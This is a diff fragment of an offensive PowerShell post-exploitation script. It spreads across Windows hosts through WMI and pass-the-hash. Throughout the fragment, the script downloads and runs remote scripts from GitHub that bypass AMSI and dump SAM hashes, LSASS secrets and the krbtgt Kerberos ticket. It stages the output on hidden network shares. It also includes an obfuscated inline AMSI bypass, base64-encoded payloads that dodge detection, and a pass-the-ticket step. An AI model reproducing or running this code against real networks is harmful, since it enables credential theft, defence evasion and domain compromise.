+				$commandtoencode2 = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
+				
+				$base64command3 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode2))
+				
 				Start-Job -ScriptBlock {
-					param($pwd, $base64command, $SMBExecUsername, $DomainHASH, $WMITarget)
+					param($pwd, $base64command2, $FinalCommand, $base64command3, $SMBExecUsername, $DomainHASH, $WMITarget)
 					S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 					iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Exc.ps1')
-					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command"
-				} -ArgumentList $pwd, $base64command, $SMBExecUsername, $DomainHASH, $_
+					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command2"
+					Start-Sleep 1
+					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -Command $FinalCommand"
+					Start-Sleep 1
+					Invoke-Exc -Target $WMITarget -Username $SMBExecUsername -Hash $DomainHASH -Command "powershell -ep bypass -enc $base64command3"
+				} -ArgumentList $pwd, $base64command2, $FinalCommand, $base64command3, $SMBExecUsername, $DomainHASH, $_
 			}
 
 			Wait-Job $dumpinghashesjob > $null
@@ -1674,7 +1806,39 @@ if($Username){
 			
 			$WMITargets | ForEach-Object {
 			
-				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") | Out-File c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1""); Get-Sam -Command ""-target=127.0.0.1"" >> c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1""); Invoke-Ribes -Command ""dump /service:krbtgt /nowrap"" >> c:\Users\Public\$eightrandom\$_.txt"
+				$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
+		
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+					
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
+				
+				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+				
+				$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
+				
+				$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+				
+				$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+				
+				Start-Sleep 1
+				
+				$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+				
+				$processCommand2 = "powershell.exe -Command $Command2"
+				
+				Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+				
+				Start-Sleep 1
+				
+				$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 				
 				$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
 				
@@ -1713,7 +1877,39 @@ if($Username){
 		
 		$WMITargets | ForEach-Object {
 			
-			$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") | Out-File c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1""); Get-Sam -Command ""-target=127.0.0.1"" >> c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1""); Invoke-Ribes -Command ""dump /service:krbtgt /nowrap"" >> c:\Users\Public\$eightrandom\$_.txt"
+			$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
+		
+			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+			
+			$processCommand = "powershell.exe -ep bypass -enc $base64command"
+			
+			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+			
+			Start-Sleep 1
+				
+			$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
+			
+			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+			
+			$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
+			
+			$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+			
+			$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+			
+			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+			
+			Start-Sleep 1
+			
+			$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+			
+			$processCommand2 = "powershell.exe -Command $Command2"
+			
+			Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+			
+			Start-Sleep 1
+			
+			$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 			
 			$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
 			
@@ -1750,8 +1946,40 @@ if($Username){
 else{
 	
 	$WMITargets | ForEach-Object {
+		
+		$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom"
+		
+		$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+		
+		$processCommand = "powershell.exe -ep bypass -enc $base64command"
+		
+		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+		
+		Start-Sleep 1
 			
-		$commandtoencode = "mkdir c:\Users\Public\$eightrandom; net share $eightrandom$=c:\Users\Public\$eightrandom; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") | Out-File c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Get-Sam.ps1""); Get-Sam -Command ""-target=127.0.0.1"" >> c:\Users\Public\$eightrandom\$_.txt; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1""); Invoke-Ribes -Command ""dump /service:krbtgt /nowrap"" >> c:\Users\Public\$eightrandom\$_.txt"
+		$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1`"); iex(new-object net.webclient).downloadstring(`"https://raw.githubusercontent.com/Leo4j/Tools/main/dumper.ps1`") *> c:\Users\Public\$eightrandom\$_.txt"
+		
+		$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
+		
+		$FullCommand = "Set-Content -Path `"c:\Users\Public\$eightrandom\temp.txt`" -Value $base64command"
+		
+		$base64command2 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
+		
+		$processCommand = "powershell.exe -ep bypass -enc $base64command2"
+		
+		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand > $null
+		
+		Start-Sleep 1
+		
+		$Command2 = "`$encstring = (Get-Content c:\Users\Public\$eightrandom\temp.txt); `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
+		
+		$processCommand2 = "powershell.exe -Command $Command2"
+		
+		Invoke-WmiMethod -ComputerName $_ -Class Win32_Process -Name Create -ArgumentList $processCommand2 > $null
+		
+		Start-Sleep 1
+		
+		$commandtoencode = "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/SimpleAMSI.ps1""); iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patamenia.ps1"") >> c:\Users\Public\$eightrandom\$_.txt"
 		
 		$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandtoencode))
 		
@@ -2027,7 +2255,7 @@ if($UserName){
 	if($Username.Contains(".\")){}
 	else{
 		klist purge > $null
-		Invoke-Ribes -Command "asktgt /user:$env:username /password:$currentuserpassword /ptt" > $null
+		Invoke-Ribes -Command "ptt /ticket:$currentuserpassword" > $null
 	}
 }
 
